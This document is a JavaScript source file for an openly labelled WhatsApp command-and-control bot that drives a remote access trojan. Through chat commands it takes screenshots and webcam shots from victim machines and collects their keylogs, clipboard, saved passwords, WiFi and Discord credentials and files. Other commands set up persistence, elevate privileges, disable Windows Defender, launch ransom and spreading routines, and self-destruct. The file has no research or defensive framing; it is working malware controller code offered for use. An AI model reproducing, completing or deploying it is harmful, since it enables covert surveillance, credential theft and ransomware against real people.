import makeWASocket, { 
  DisconnectReason, 
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import qrcode from 'qrcode-terminal';
import pino from 'pino';
import chalk from 'chalk';
import fs from 'fs';
import { ResponseFormatter } from './utils/formatter.js';
import { RATClient } from './utils/ratClient.js';
import { SurveillanceCommands } from './commands/surveillance.js';
import { CredentialCommands } from './commands/credentials.js';
import { SystemCommands } from './commands/system.js';
import { FunCommands } from './commands/fun.js';

/**
 * T0OL-B4S3-263 WhatsApp C2 Bot
 * Ultimate RAT Control via WhatsApp
 */

class WhatsAppC2Bot {
  constructor() {
    this.config = this.loadConfig();
    this.sock = null;
    this.ratClient = null;
    this.currentSession = null;
    this.commandPrefix = this.config.whatsapp.prefix;
    this.ownerNumbers = this.config.whatsapp.ownerNumbers;
    
    // Command modules will be initialized after socket connection
    this.surveillanceCmd = new SurveillanceCommands(null, null);
    this.credentialCmd = new CredentialCommands(null, null);
    this.systemCmd = new SystemCommands(null, null);
    this.funCmd = new FunCommands(null, null);
  }

  /**
   * Load configuration with validation
   */
  loadConfig() {
    try {
      const configData = fs.readFileSync('./config.json', 'utf8');
      const config = JSON.parse(configData);
      
      // Validate required fields
      this.validateConfig(config);
      
      return config;
    } catch (error) {
      console.error(chalk.red('Failed to load config.json'));
      console.error(chalk.red(`Error: ${error.message}`));
      process.exit(1);
    }
  }

  /**
   * Validate configuration structure and values
   */
  validateConfig(config) {
    const requiredFields = {
      'ratServer.host': () => config.ratServer?.host && typeof config.ratServer.host === 'string',
      'ratServer.port': () => config.ratServer?.port && typeof config.ratServer.port === 'number',
      'ratServer.encryptionKey': () => config.ratServer?.encryptionKey && typeof config.ratServer.encryptionKey === 'string',
      'whatsapp.prefix': () => config.whatsapp?.prefix && typeof config.whatsapp.prefix === 'string',
      'whatsapp.ownerNumbers': () => Array.isArray(config.whatsapp?.ownerNumbers) && config.whatsapp.ownerNumbers.length > 0,
    };

    for (const [field, validator] of Object.entries(requiredFields)) {
      if (!validator()) {
        throw new Error(`Invalid configuration: missing or invalid field '${field}'`);
      }
    }

    // Warn about default encryption key
    if (config.ratServer.encryptionKey === 'YOUR_ENCRYPTION_KEY_HERE') {
      console.warn(chalk.yellow('⚠ WARNING: Using default encryption key. Update encryptionKey in config.json for production!'));
    }
  }

  /**
   * Initialize RAT client connection
   */
  async initRATClient() {
    try {
      const host = this.config.ratServer.host || '127.0.0.1';
      const port = this.config.ratServer.port || 4444;
      const key = this.config.ratServer.encryptionKey || 'YOUR_ENCRYPTION_KEY_HERE';
      
      this.ratClient = new RATClient(host, port, key);
      
      // Test connection
      const status = await this.ratClient.checkStatus();
      
      // Initialize command modules after sock is available
      // Note: These will be re-initialized after socket connection
      
      ResponseFormatter.log('success', `RAT API connected (${status.active_sessions} sessions)`);
    } catch (error) {
      ResponseFormatter.log('error', `RAT API connection failed: ${error.message}`);
    }
  }

  /**
   * Initialize command modules
   */
  initCommandModules() {
    this.surveillanceCmd = new SurveillanceCommands(this.ratClient, this.sock);
    this.credentialCmd = new CredentialCommands(this.ratClient, this.sock);
    this.systemCmd = new SystemCommands(this.ratClient, this.sock);
    this.funCmd = new FunCommands(this.ratClient, this.sock);
    
    ResponseFormatter.log('success', 'Command modules initialized');
  }

  /**
   * Print banner
   */
  printBanner() {
    console.clear();
    console.log(chalk.cyan.bold(`
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║         T0OL-B4S3-263 WhatsApp C2 Bot v1.0               ║
    ║              Ultimate RAT Control System                   ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    `));
    
    ResponseFormatter.log('info', 'Bot starting...');
  }

  /**
   * Check if user is authorized
   */
  isAuthorized(userJid) {
    return this.ownerNumbers.includes(userJid);
  }

  /**
   * Handle incoming messages
   */
  async handleMessage(msg) {
    if (!msg.message) return;
    
    const messageType = Object.keys(msg.message)[0];
    
    // Handle text messages
    if (messageType === 'conversation' || messageType === 'extendedTextMessage') {
      const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
      const from = msg.key.remoteJid;
      const sender = msg.key.participant || msg.key.remoteJid;
      
      // Check authorization
      if (!this.isAuthorized(sender)) {
        ResponseFormatter.log('warning', `Unauthorized access attempt from ${sender}`);
        await this.sock.sendMessage(from, { 
          text: '❌ *UNAUTHORIZED*\n\nYou are not authorized to use this bot.' 
        });
        return;
      }

      // Check if message starts with prefix
      if (!text.startsWith(this.commandPrefix)) return;

      // Parse command
      const args = text.slice(this.commandPrefix.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      ResponseFormatter.log('info', `Command received: ${command} from ${sender.split('@')[0]}`);

      // Route command
      await this.routeCommand(from, command, args, msg);
    }
  }

  /**
   * Route command to appropriate handler
   */
  async routeCommand(chatId, command, args, msg) {
    try {
      // Send "executing" status for most commands
      if (!['help', 'ping', 'sessions', 'active'].includes(command)) {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.executing(`/${command} ${args.join(' ')}`)
        });
      }

      switch (command) {
        // ========== HELP & INFO ==========
        case 'help':
        case 'menu':
          await this.cmdHelp(chatId);
          break;

        case 'ping':
          await this.cmdPing(chatId);
          break;

        // ========== SESSION MANAGEMENT ==========
        case 'sessions':
          await this.cmdSessions(chatId);
          break;

        case 'use':
          await this.cmdUseSession(chatId, args);
          break;

        case 'active':
          await this.cmdActiveSession(chatId);
          break;

        case 'kill':
          await this.cmdKillSession(chatId, args);
          break;

        // ========== SYSTEM INFO ==========
        case 'sysinfo':
          await this.systemCmd.sysinfo(chatId, this.currentSession);
          break;

        case 'processes':
          await this.systemCmd.processes(chatId, this.currentSession);
          break;

        case 'metrics':
          await this.systemCmd.metrics(chatId, this.currentSession);
          break;

        case 'software':
          await this.systemCmd.software(chatId, this.currentSession);
          break;

        // ========== SURVEILLANCE ==========
        case 'screenshot':
        case 'ss':
          await this.surveillanceCmd.screenshot(chatId, this.currentSession);
          break;

        case 'webcam':
        case 'cam':
          await this.surveillanceCmd.webcam(chatId, this.currentSession);
          break;

        case 'keylogs':
        case 'keys':
          await this.surveillanceCmd.keylogs(chatId, this.currentSession);
          break;

        case 'record':
          const duration = parseInt(args[0]) || 5;
          await this.surveillanceCmd.record(chatId, this.currentSession, duration);
          break;

        case 'clipboard':
        case 'clip':
          await this.surveillanceCmd.clipboard(chatId, this.currentSession);
          break;

        // ========== CREDENTIALS ==========
        case 'passwords':
        case 'pass':
          await this.credentialCmd.passwords(chatId, this.currentSession);
          break;

        case 'wifi':
          await this.credentialCmd.wifi(chatId, this.currentSession);
          break;

        case 'discord':
          await this.credentialCmd.discord(chatId, this.currentSession);
          break;

        case 'history':
          await this.credentialCmd.history(chatId, this.currentSession, args[0]);
          break;

        // ========== NETWORK ==========
        case 'netscan':
        case 'scan':
          await this.systemCmd.networkScan(chatId, this.currentSession);
          break;

        case 'locate':
        case 'geo':
          await this.systemCmd.locate(chatId, this.currentSession);
          break;

        // ========== PROCESS CONTROL ==========
        case 'killproc':
          await this.systemCmd.killProcess(chatId, this.currentSession, args[0]);
          break;

        // ========== FILES ==========
        case 'download':
        case 'dl':
          await this.cmdDownload(chatId, args);
          break;

        // ========== FUN FEATURES ==========
        case 'msgbox':
          await this.funCmd.messageBox(chatId, this.currentSession, args.join(' '));
          break;

        case 'beep':
          await this.funCmd.beep(chatId, this.currentSession);
          break;

        case 'lock':
          await this.funCmd.lock(chatId, this.currentSession);
          break;

        // ========== PERSISTENCE ==========
        case 'persist':
          await this.funCmd.persist(chatId, this.currentSession);
          break;

        case 'elevate':
          await this.funCmd.elevate(chatId, this.currentSession);
          break;

        case 'defenderoff':
          await this.funCmd.defenderOff(chatId, this.currentSession);
          break;

        // ========== ADVANCED ==========
        case 'ransom':
          await this.funCmd.ransom(chatId, this.currentSession, args.join(' '));
          break;

        case 'spread':
          await this.funCmd.spread(chatId, this.currentSession);
          break;

        case 'selfdestruct':
          await this.funCmd.selfDestruct(chatId, this.currentSession);
          break;

        default:
          await this.sock.sendMessage(chatId, { 
            text: ResponseFormatter.error(`Unknown command: */${command}*\n\nType /help for command list.`)
          });
      }
    } catch (error) {
      ResponseFormatter.log('error', `Command error: ${error.message}`);
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(`Command failed: ${error.message}`)
      });
    }
  }

  // ═══════════════════════════════════════════════════════════
  // BASIC COMMAND HANDLERS (Not in modules)
  // ═══════════════════════════════════════════════════════════

  async cmdHelp(chatId) {
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.helpMenu() 
    });
  }

  async cmdPing(chatId) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    const response = `🏓 *PONG!*\n\n` +
                    `✅ Bot Status: Online\n` +
                    `⏱️ Uptime: ${hours}h ${minutes}m\n` +
                    `🔌 RAT Server: ${this.ratClient?.connected ? 'Connected' : 'Ready'}\n` +
                    `📱 Active Session: ${this.currentSession || 'None'}`;
    
    await this.sock.sendMessage(chatId, { text: response });
  }

  async cmdSessions(chatId) {
    try {
      const sessions = await this.ratClient.getSessions();
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.sessionList(sessions) 
      });
    } catch (error) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(`Failed to get sessions: ${error.message}`) 
      });
    }
  }

  async cmdUseSession(chatId, args) {
    if (args.length === 0) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /use <session_id>') 
      });
      return;
    }

    const sessionId = parseInt(args[0]);
    this.currentSession = sessionId;
    this.ratClient.setActiveSession(sessionId);
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.success(`Switched to session *${sessionId}*`) 
    });
  }

  async cmdActiveSession(chatId) {
    if (!this.currentSession) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /sessions to list available sessions.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`Current session: *${this.currentSession}*`) 
    });
  }

  async cmdKillSession(chatId, args) {
    if (args.length === 0) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /kill <session_id>') 
      });
      return;
    }

    const sessionId = parseInt(args[0]);
    
    try {
      await this.ratClient.sendCommand(sessionId, 'exit', 5000);
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`Session *${sessionId}* killed`) 
      });
    } catch (error) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(`Failed to kill session: ${error.message}`) 
      });
    }
  }

  async cmdDownload(chatId, args) {
    if (!this.currentSession) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (args.length === 0) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /download <filepath>') 
      });
      return;
    }

    const filepath = args.join(' ');
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`📥 Downloading file...\n\n\`${filepath}\`\n\n_Please wait..._`) 
    });

    try {
      const result = await this.ratClient.sendCommand(this.currentSession, `download ${filepath}`, 60000);
      
      if (result.success) {
        // Check if it's base64 file data
        if (!result.data.startsWith('[')) {
          const buffer = Buffer.from(result.data, 'base64');
          const filename = filepath.split(/[/\\]/).pop();
          
          await this.sock.sendMessage(chatId, { 
            document: buffer,
            mimetype: 'application/octet-stream',
            fileName: filename,
            caption: `📥 Downloaded: ${filename}`
          });
        } else {
          await this.sock.sendMessage(chatId, { 
            text: ResponseFormatter.info(result.data) 
          });
        }
      } else {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.error(result.error) 
        });
      }
    } catch (error) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(`Download failed: ${error.message}`) 
      });
    }
  }

  /**
   * Start the bot
   */
  async start() {
    this.printBanner();
    
    // Initialize RAT client
    await this.initRATClient();

    // Setup auth
    const { state, saveCreds } = await useMultiFileAuthState('./sessions');
    
    // Get latest Baileys version
    const { version } = await fetchLatestBaileysVersion();

    // Create socket
    this.sock = makeWASocket({
      version,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
      },
      printQRInTerminal: true,
      logger: pino({ level: 'silent' }),
      browser: ['T0OL-B4S3-263', 'Chrome', '1.0.0']
    });

    // Initialize command modules after sock is created
    this.initCommandModules();

    // Save credentials
    this.sock.ev.on('creds.update', saveCreds);

    // Connection updates
    this.sock.ev.on('connection.update', (update) => {
      const { connection, lastDisconnect, qr } = update;
      
      if (qr) {
        console.log('\n');
        qrcode.generate(qr, { small: true });
        console.log(chalk.cyan('\n📱 Scan QR code with WhatsApp\n'));
      }

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        
        ResponseFormatter.log('error', 'Connection closed');
        
        if (shouldReconnect) {
          ResponseFormatter.log('info', 'Reconnecting...');
          setTimeout(() => this.start(), 3000);
        }
      } else if (connection === 'open') {
        ResponseFormatter.log('success', 'WhatsApp connected!');
        console.log(chalk.green.bold('\n✓ Bot is ready!\n'));
      }
    });

    // Message handler
    this.sock.ev.on('messages.upsert', async ({ messages }) => {
      const msg = messages[0];
      if (!msg.key.fromMe && msg.message) {
        await this.handleMessage(msg);
      }
    });
  }
}

// Start the bot
const bot = new WhatsAppC2Bot();
bot.start().catch(console.error);